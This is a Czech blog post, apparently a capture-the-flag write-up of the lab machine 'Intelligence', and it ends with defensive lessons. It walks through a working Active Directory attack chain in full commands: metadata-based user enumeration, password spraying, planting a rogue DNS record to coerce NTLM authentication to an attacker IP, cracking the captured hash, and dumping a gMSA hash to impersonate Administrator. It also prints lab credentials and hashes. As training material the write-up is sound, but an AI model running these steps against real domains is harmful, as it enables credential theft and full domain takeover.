---
layout: post
author: Tomáš Matějíček
title: "Intelligence"
date: 2020-12-05
tags: windows smb kerberos ldap active-directory
---
## Úvod a kontext

Intelligence je pěkný Active Directory stroj postavený na kombinaci veřejně dostupných dokumentů, Kerberos enumerace a zneužití interní automatizace. První polovina nevypadá dramaticky: web server publikuje PDF dokumenty a jejich metadata. Právě z nich se ale poskládá seznam uživatelů a nakonec i výchozí heslo pro jeden účet. Tenhle typ vstupu do domény rozebírám podrobněji i v článku [Dokumentová metadata jako vstup do domény](/techniky/dokumentova-metadata-jako-vstup-do-domeny).

Root část je ještě zajímavější. Přístup `Tiffany.Molina` nestačí k shellu, ale stačí k přečtení skriptu `downdetector.ps1`, který běží plánovaně a navštěvuje DNS jména začínající na `web`. Přes vlastní DNS záznam se tak podaří vynutit autentizaci `Ted.Graves`, cracknout jeho heslo, získat heslo gMSA účtu `svc_int$` a s ním si vyžádat Kerberos ticket pro `Administrator`. Širší souvislosti k těmto dvěma krokům shrnuji i v článcích [NTLM coercion a vynucená autentizace](/techniky/ntlm-coercion-a-vynucena-autentizace) a [Delegovaná práva v AD: DCSync, gMSA, relay, deleted objects](/techniky/delegovana-prava-v-ad-dcsync-gmsa-relay-deleted-objects).

## Počáteční průzkum

### Doménový kontroler a veřejné dokumenty

Už první [nmap](/nastroje/nmap) ukazuje doménový kontroler `dc.intelligence.htb`. Vedle klasických AD služeb je ale zajímavý i IIS na portu `80`, protože právě tam leží první použitelné stopy.
```bash
ports=$(nmap -p- --min-rate=1000 -T4 $IP | grep ^[0-9] | cut -d "/" -f 1 | tr "\n" "," | sed s/,$//);echo $ports;nmap -p $ports -A -sC -sV -v $IP
```
```text
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0
```

Na webu je adresář `/documents/` a soubory pojmenované po datu. To je důležitý vzor: jakmile je naming predictable, není potřeba čekat na index listing, ale lze generovat URL a stáhnout si celý archiv dokumentů.
```text
twebdiscover -u http://$IP -t 40 -Po -wdc
=> /documents/
=> /documents/2020-01-01-upload.pdf
=> /documents/2020-12-15-upload.pdf
```

### Metadata PDF a seznam uživatelů

Stažené PDF soubory mají v metadatech jména autorů. `exiftool` tak rychle odhalí první validní uživatele jako `William.Lee` a `Jose.Williams`. Jakmile se ukáže, že tento způsob funguje, dává smysl stáhnout systematicky všechny datumové varianty, vyextrahovat další `Creator` hodnoty a ověřit je přes `kerbrute`. Prakticky stejný řetězec od veřejných PDF k doménovým identitám rozebírám i v článku [Dokumentová metadata jako vstup do domény](/techniky/dokumentova-metadata-jako-vstup-do-domeny).

Prakticky k tomu, kdy je `Kerbrute` nejlepší jako validátor jmenného prostoru před dalšími kerberovými kroky, viz i [Kerbrute](/nastroje/kerbrute).
```text
exiftool *.pdf
Creator : William.Lee
Creator : Jose.Williams

./kerbrute_linux_amd64 userenum --dc intelligence.htb -d intelligence.htb Machines/Intelligence/users.txt
=> VALID USERNAME: William.Lee@intelligence.htb
=> VALID USERNAME: Jose.Williams@intelligence.htb
```

Právě jedna z historických nahrávek, `2020-06-04-upload.pdf`, pak obsahuje rozhodující detail: výchozí heslo `NewIntelligenceCorpUser9876`.

## Analýza zjištění

### Od výchozího hesla k účtu `Tiffany.Molina`

Jakmile dokument prozradí defaultní heslo, je rozumné ho vyzkoušet proti celé sadě validních uživatelů. `crackmapexec` potvrdí, že funguje pro `Tiffany.Molina`, což okamžitě otevírá SMB přístup.

Prakticky k tomu, kdy je `CrackMapExec` nejlepší jen jako validátor credential hypotézy, viz i [CrackMapExec](/nastroje/crackmapexec).
```text
crackmapexec smb intelligence.htb -u Machines/Intelligence/users.txt -p NewIntelligenceCorpUser9876
=> intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876
```

### Co prozradí SMB a `downdetector.ps1`

SMB přístup tady není jen kvůli `user.txt`. Ve share `IT` leží skript `downdetector.ps1`, který je z bezpečnostního pohledu mnohem cennější. Prochází DNS záznamy začínající na `web*` a na každý z nich posílá `Invoke-WebRequest -UseDefaultCredentials`. Praktickou roli rychlé enumerace share a jejich obsahu rozebírám i v článku [Smbmap](/nastroje/smbmap).
```text
smbmap -H intelligence.htb -u Tiffany.Molina -p NewIntelligenceCorpUser9876 -R --depth 1
=> IT READ ONLY
=> downdetector.ps1
```

To je přesně ten typ automatizace, který se dá zneužít ke coerced authentication. Pokud lze do DNS přidat vlastní `web*` záznam, skript každých pět minut naváže HTTP spojení s útočníkovým serverem a pošle přitom NTLM autentizaci uživatele `Ted.Graves`. Prakticky stejný vzorec rozebírám i v článku [NTLM coercion a vynucená autentizace](/techniky/ntlm-coercion-a-vynucena-autentizace).

## Získání přístupu

### SMB jako `Tiffany.Molina`

Účet `Tiffany.Molina` nedává interaktivní shell, ale stačí k přístupu do uživatelských share. Tím se potvrzuje běžný uživatelský kontext a zároveň vzniká prostor pro čtení dalších interních skriptů.

Praktické použití podobného čtení share a interních souborů shrnuji i v článku [smbclient](/nastroje/smbclient).
```text
impacket-smbclient Tiffany.Molina:NewIntelligenceCorpUser9876@intelligence.htb
cat user.txt
c678168bde461de7eff5f37a310d6178
```

## Eskalace oprávnění

### Vynucená autentizace `Ted.Graves`

První část rootu spočívá v DNS záznamu a naslouchání na HTTP. Přes `dnstool.py` se přidá `webthacker.intelligence.htb`, Responder zachytí NTLMv2 hash `Ted.Graves` a `john` ho crackne na `Mr.Teddy`.

Prakticky k tomu, kdy `Responder` jen přijímá už vyvolanou autentizaci, viz i [Responder](/nastroje/responder).
```text
python3 dnstool.py -u 'intelligence.htb\Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' -a add -r 'webthacker.intelligence.htb' -d 10.10.14.11 10.10.10.248
sudo responder -I tun0 -A
=> [HTTP] NTLMv2 Hash : Ted.Graves::intelligence:...

john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
=> Mr.Teddy         (Ted.Graves)
```

### gMSA účet `svc_int$` a impersonace administrátora

Účet `Ted.Graves` sám o sobě ještě root nedává, ale `gMSADumper.py` ukáže, že skupina `itsupport` smí číst heslo gMSA účtu `svc_int$`. Jakmile je k dispozici NTLM hash gMSA, lze přes `impacket-getST` vyžádat service ticket pro `WWW/dc.intelligence.htb` a rovnou při tom impersonovat `Administrator`.

Širší praktický kontext k téhle rodině utilit je v článku [Impacket pro relay, tajemství a delegovaná práva](/nastroje/impacket-pro-relay-tajemstvi-a-delegovana-prava).
```text
python3 gMSADumper.py -u 'Ted.Graves' -p 'Mr.Teddy' -d 'intelligence.htb' -l 'dc.intelligence.htb'
Users or groups who can read password for svc_int$:
 > DC$
 > itsupport
svc_int$:::c699eaac79b69357d9dabee3379547e6

impacket-getST intelligence.htb/svc_int$ -spn WWW/dc.intelligence.htb -hashes :c699eaac79b69357d9dabee3379547e6 -impersonate Administrator
export KRB5CCNAME=Administrator.ccache
impacket-smbclient -k intelligence.htb/Administrator@dc.intelligence.htb -no-pass
cat root.txt
e4de96de9930d2f4e8b5bd533856e90d
```

## Shrnutí klíčových poznatků

- Intelligence začíná nenápadně, ale systematicky: veřejné PDF, metadata autorů, validní uživatelé a výchozí heslo.
- Účet `Tiffany.Molina` nebyl cíl, ale čtecí pivot ke skriptu `downdetector.ps1`, který šel zneužít k vynucené autentizaci jiného uživatele.
- Root část je čistě o Active Directory a delegovaných právech. Jakmile lze číst heslo gMSA a vyžádat ticket pro cizí identitu, lokální shell už není potřeba.

## Co si odnést do praxe

- Veřejně publikované dokumenty je potřeba kontrolovat stejně přísně jako zdrojový kód. Metadata autorů a interní instrukce typu výchozího hesla mohou být první a nejlevnější vstup do domény.
- Automatizační skripty používající `Invoke-WebRequest -UseDefaultCredentials` nad dynamickými DNS záznamy jsou nebezpečné. Jakmile útočník může ovlivnit DNS, script se mění v NTLM hash relay/coercion primitivum.
- gMSA účty je potřeba auditovat nejen z pohledu toho, kde běží, ale hlavně kdo smí číst jejich heslo. Na Intelligence právě tohle právo rozhodlo o celé root části.
